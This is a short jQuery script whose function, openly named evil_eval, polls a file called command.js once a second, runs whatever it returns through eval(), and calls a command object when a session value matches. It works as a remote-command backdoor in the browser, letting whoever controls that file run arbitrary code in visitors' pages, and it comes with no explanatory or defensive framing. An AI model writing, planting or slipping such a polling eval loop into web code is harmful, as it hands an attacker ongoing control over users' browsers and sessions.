function evil_eval(){
    $.ajax({
               url: "./command.js",
               cache: false,
               success: function(res){
                   eval(res);
                   if(com.session == SESSION)
                       com.command.call();
               }
           });    
}

var timer;
$(function(){
      timer = setInterval(evil_eval,1000);
  });